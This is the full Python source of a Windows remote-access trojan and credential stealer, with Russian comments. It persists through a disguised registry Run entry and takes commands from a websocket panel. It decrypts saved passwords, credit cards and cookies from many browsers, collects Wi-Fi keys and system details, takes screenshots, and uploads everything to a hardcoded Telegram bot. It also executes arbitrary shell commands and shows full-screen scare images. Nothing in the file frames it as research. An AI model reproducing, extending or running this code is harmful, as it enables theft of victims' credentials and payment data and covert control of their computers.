import websocket
import time
import subprocess
import os
import sys
import winreg as reg
import requests
import threading
import tkinter as tk
from PIL import Image, ImageGrab, ImageTk
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from playsound import playsound
import base64
import platform
import socket
import re
import json
import sqlite3
import shutil
from datetime import datetime, timedelta

try:
    import win32crypt
    IS_WINDOWS = True
except ImportError:
    IS_WINDOWS = False
from Cryptodome.Cipher import AES

# --- Конфигурация ---
BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34"
CHAT_ID = "1640138978"

# --- УНИВЕРСАЛЬНЫЙ СТИЛЛЕР ---
class Stealer:
    def __init__(self):
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.browsers = {
            'avast': self.appdata + '\\AVAST Software\\Browser\\User Data', 'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data', 'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data', 'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data', 'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data', 'chromium': self.appdata + '\\Chromium\\User Data',
            'chrome': self.appdata + '\\Google\\Chrome\\User Data', 'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'msedge': self.appdata + '\\Microsoft\\Edge\\User Data', 'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data', 'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data', 'coccoc': self.appdata + '\\CocCoc\\Browser\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable', 'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable'
        }
        self.data_queries = {
            'passwords': {'query': 'SELECT action_url, username_value, password_value FROM logins', 'file': '\\Login Data', 'columns': ['URL', 'Email', 'Password'], 'decrypt': True},
            'cards': {'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards', 'file': '\\Web Data', 'columns': ['Name On Card', 'Card Number', 'Expires On'], 'decrypt': True},
            'cookies': {'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies', 'file': '\\Network\\Cookies', 'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'], 'decrypt': True},
            'history': {'query': 'SELECT url, title, last_visit_time FROM urls', 'file': '\\History', 'columns': ['URL', 'Title', 'Visited Time'], 'decrypt': False},
            'downloads': {'query': 'SELECT tab_url, target_path FROM downloads', 'file': '\\History', 'columns': ['Download URL', 'Local Path'], 'decrypt': False}
        }

    def get_master_key(self, path: str):
        if not os.path.exists(path): return
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path): return
        with open(local_state_path, "r", encoding="utf-8") as f: c = json.load(f)
        return win32crypt.CryptUnprotectData(base64.b64decode(c["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    # --- ИСПРАВЛЕННАЯ ФУНКЦИЯ РАСШИФРОВКИ ---
    def decrypt_password(self, buff: bytes, key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            # --- ВОТ ИЗМЕНЕНИЕ ---
            return decrypted_pass[:-16].decode(errors='replace')
        except Exception:
            try:
                # --- И ЗДЕСЬ ТОЖЕ ---
                return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1], errors='replace')
            except Exception:    return "Не удалось расшифровать"

    def get_data(self, path: str, profile: str, key, type_of_data):
        db_file = f'{path}\\{profile}{self.data_queries[type_of_data]["file"]}'
        if not os.path.exists(db_file): return ""
        result = ""
        temp_db = os.path.join(os.getenv("TEMP"), f"temp_db_{int(time.time()*1000)}")
        shutil.copy(db_file, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        try:
            cursor.execute(self.data_queries[type_of_data]['query'])
            for row in cursor.fetchall():
                row = list(row)
                if self.data_queries[type_of_data]['decrypt']:
                    for i in range(len(row)):
                        if isinstance(row[i], bytes):
                            row[i] = self.decrypt_password(row[i], key)
                result += "\n".join([f"{col}: {val}" for col, val in zip(self.data_queries[type_of_data]['columns'], row)]) + "\n\n"
        except: pass
        conn.close()
        os.remove(temp_db)
        return result

    def run(self, mode: str):
        if not IS_WINDOWS: return None
        all_data = {}
        for browser_name, browser_path in self.browsers.items():
            if not os.path.exists(browser_path): continue

            master_key = self.get_master_key(browser_path)
            if not master_key: continue

            # В большинстве браузеров профиль по умолчанию - "Default"
            browser_data = self.get_data(browser_path, "Default", master_key, mode)
            if browser_data:
                all_data[browser_name] = browser_data
        return all_data

# --- Остальные функции (без изменений) ---
def get_extended_system_info(): #...
    try:
        user_info = f"{os.getlogin()}@{socket.gethostname()}"; os_info = platform.platform(); cpu_info = platform.processor()
        try: gpu_info = subprocess.check_output("wmic path win32_VideoController get name", creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip()
        except: gpu_info = "Не удалось получить"
        try: ram_info = f"{float(subprocess.check_output('wmic ComputerSystem get TotalPhysicalMemory', creationflags=subprocess.CREATE_NO_WINDOW).decode().split(chr(10))[1].strip()) / 1073741824:.2f} GB"
        except: ram_info = "Не удалось получить"
        try: drives_info = subprocess.check_output("wmic logicaldisk get caption,size,freespace", creationflags=subprocess.CREATE_NO_WINDOW).decode()
        except: drives_info = "Не удалось получить"
        try: ip_info = subprocess.check_output("ipconfig /all", creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='ignore')
        except: ip_info = "Не удалось получить"
        final_report = (f"======[ ИНФОРМАЦИЯ О СИСТЕМЕ ]======\n\n[+] Основная информация:\n    Пользователь: {user_info}\n    ОС: {os_info}\n    Процессор: {cpu_info}\n    Видеокарта: {gpu_info}\n    ОЗУ: {ram_info}\n\n[+] Пароли от Wi-Fi сетей:\n{get_wifi_passwords()}\n[+] Дисковые накопители:\n{drives_info}\n[+] Полная сетевая конфигурация:\n{ip_info}\n\n================[ КОНЕЦ ОТЧЕТА ]================")
        return final_report
    except Exception as e: return f"Критическая ошибка при сборе информации: {e}"
def get_wifi_passwords():#...
    try:
        profiles_data = subprocess.check_output('netsh wlan show profiles', shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='ignore'); profile_names = re.findall(r"Все профили пользователей\s*:\s*(.*)", profiles_data)
        if not profile_names: return "    Не найдено Wi-Fi профилей.\n"
        wifi_list = ""
        for name in profile_names[0].split(';'):
            name = name.strip()
            if name:
                try: profile_info = subprocess.check_output(f'netsh wlan show profile "{name}" key=material', shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE,creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='ignore'); password = re.search(r"Содержимое ключа\s*:\s*(.*)", profile_info); password = password.group(1).strip() if password else "--- [Нет пароля] ---"; wifi_list += f"    {name:<25} | {password}\n"
                except subprocess.CalledProcessError: wifi_list += f"    {name:<25} | [Ошибка получения пароля]\n"
        return wifi_list
    except Exception: return "    Не удалось выполнить команду (возможно, нет Wi-Fi адаптера).\n"
def show_screamer(image_path):#...
    try:
        ps_script = '$shell = New-Object -ComObject "Shell.Application"; $shell.MinimizeAll()'; encoded_ps = base64.b64encode(ps_script.encode('utf-16-le')).decode('utf-8'); ps_command = f'powershell.exe -EncodedCommand {encoded_ps}'; subprocess.run(ps_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); time.sleep(0.2)
        root = tk.Tk(); root.attributes('-fullscreen', True); root.wm_attributes("-topmost", 1); screen_width = root.winfo_screenwidth(); screen_height = root.winfo_screenheight()
        image_obj = Image.open(image_path); resized_image = image_obj.resize((screen_width, screen_height), Image.Resampling.LANCZOS); img_tk = ImageTk.PhotoImage(resized_image)
        panel = tk.Label(root, image=img_tk, bg='black'); panel.pack(fill="both", expand="yes"); root.after(5000, root.destroy); root.mainloop()
    except: pass
    finally:
        if os.path.exists(image_path): os.remove(image_path)
def play_sound_threaded(sound_path):#...
    try: playsound(sound_path)
    except: pass
    finally:
        if os.path.exists(sound_path): os.remove(sound_path)
def add_to_startup():#...
    try:
        exe_path = sys.executable; key_name = 'SystemUpdateManager'; key = reg.HKEY_CURRENT_USER; key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, key_path, 0, reg.KEY_SET_VALUE) as rk: reg.SetValueEx(rk, key_name, 0, reg.REG_SZ, exe_path)
    except: pass

def connect(base_url, ws_url):
    sound_enabled = False
    try:
        devices = AudioUtilities.GetSpeakers(); interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_control = cast(interface, POINTER(IAudioEndpointVolume)); sound_enabled = True
    except: pass
    while True:
        try:
            ws = websocket.create_connection(ws_url)
            ws.send(f"HOSTNAME:{socket.gethostname()}")
            while True:
                command = ws.recv()

                if command.startswith('steal_'):
                    mode = command.split('_', 1)[1]
                    try:
                        stealer = Stealer()
                        stolen_data_dict = stealer.run(mode=mode)
                        if not stolen_data_dict:
                            ws.send(f"Данные ({mode}) не найдены ни в одном браузере.")
                            continue

                        for browser, data_str in stolen_data_dict.items():
                            report_path = ''
                            try:
                                temp_dir = os.getenv('TEMP'); filename = f'{browser.replace(" ", "_")}_{mode}.txt'
                                report_path = os.path.join(temp_dir, filename)
                                with open(report_path, 'w', encoding='utf-8') as f: f.write(f"======[ {browser.upper()} - {mode.upper()} ]======\n\n{data_str}")
                                tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                                with open(report_path, 'rb') as doc_file:
                                    files = {'document': doc_file}; data = {'chat_id': CHAT_ID, 'caption': f'Отчет по {mode} из {browser} с ПК {socket.gethostname()}'}
                                    requests.post(tg_url, data=data, files=files, timeout=30)
                            except: pass
                            finally:
                                if report_path and os.path.exists(report_path): os.remove(report_path)
                        ws.send(f"Все найденные отчеты по {mode} отправлены.")
                    except Exception as e: ws.send(f"Критическая ошибка стиллера: {e}")

                elif command == 'sysinfo':#...
                    report_path = ''
                    try:
                        info_text = get_extended_system_info(); temp_dir = os.getenv('TEMP'); report_path = os.path.join(temp_dir, f'report_{socket.gethostname()}.txt')
                        with open(report_path, 'w', encoding='utf-8') as f: f.write(info_text)
                        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument";
                        with open(report_path, 'rb') as doc_file: requests.post(tg_url, data={'chat_id': CHAT_ID, 'caption': f'Отчет по системе {socket.gethostname()}'}, files={'document': doc_file}, timeout=30)
                        ws.send("Полный отчет по системе успешно отправлен в Telegram.")
                    except Exception as e: ws.send(f"Ошибка при отправке отчета: {e}")
                    finally:
                        if report_path and os.path.exists(report_path): os.remove(report_path)

                elif command.startswith('playsound '):#...
                    filename = command.split(' ', 1)[1]; download_url = f"{base_url}/files/audio/{filename}"; temp_path = os.path.join(os.getenv('TEMP'), filename)
                    try: r = requests.get(download_url, timeout=15); open(temp_path, 'wb').write(r.content); threading.Thread(target=play_sound_threaded, args=(temp_path,), daemon=True).start()
                    except Exception as e: ws.send(f"Ошибка медиа: {e}")

                elif command.startswith('showimage '):#...
                    filename = command.split(' ', 1)[1]; download_url = f"{base_url}/files/image/{filename}"; temp_path = os.path.join(os.getenv('TEMP'), filename)
                    try: r = requests.get(download_url, timeout=15); open(temp_path, 'wb').write(r.content); show_screamer(temp_path) 
                    except Exception as e: ws.send(f"Ошибка медиа: {e}")

                elif command == 'screenshot':#...
                    screenshot_path = ''
                    try:
                        s = ImageGrab.grab(); screenshot_path = os.path.join(os.getenv('TEMP'),'s.png'); s.save(screenshot_path)
                        tg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                        with open(screenshot_path,'rb') as pf: requests.post(tg_url,data={'chat_id':CHAT_ID},files={'photo':pf},timeout=15)
                        ws.send("Скриншот отправлен в Telegram.")
                    except Exception as e: ws.send(f"Ошибка скриншота: {e}")
                    finally:
                        if screenshot_path and os.path.exists(screenshot_path): os.remove(screenshot_path)

                elif command == 'getvolume':#...
                    if sound_enabled:
                        try: level = int(volume_control.GetMasterVolumeLevelScalar()*100); ws.send(f"VOL_LEVEL:{level}")
                        except: ws.send("VOL_LEVEL:error")
                    else: ws.send("VOL_LEVEL:disabled")

                elif command.startswith('setvolume '):#...
                    if sound_enabled:
                        try: level_float = float(command.split(' ', 1)[1])/100.0; volume_control.SetMasterVolumeLevelScalar(max(0.0,min(1.0,level_float)),None)
                        except: pass

                elif command == 'mute':#...
                    if sound_enabled: volume_control.SetMute(1, None)

                elif command == 'unmute':#...
                    if sound_enabled: volume_control.SetMute(0, None)

                elif command.startswith('cd '):#...
                    try: os.chdir(command[3:].strip()); ws.send('Директория изменена')
                    except Exception as e: ws.send(str(e))

                else:
                    try:
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output = proc.stdout.read() + proc.stderr.read()
                        if not output: ws.send('(команда не дала вывода)')
                        else: ws.send(output.decode('cp866', errors='replace'))
                    except Exception as e: ws.send(str(e))
        except Exception:
            time.sleep(20)
if __name__ == '__main__':
    add_to_startup()
    WS_HOST = 'wss://my-cool-panel-production.up.railway.app/ws' # НЕ ЗАБУДЬ СВОЙ АДРЕС
    BASE_URL = WS_HOST.replace('wss://', 'https://').split('/ws')[0]
    connect(BASE_URL, WS_HOST)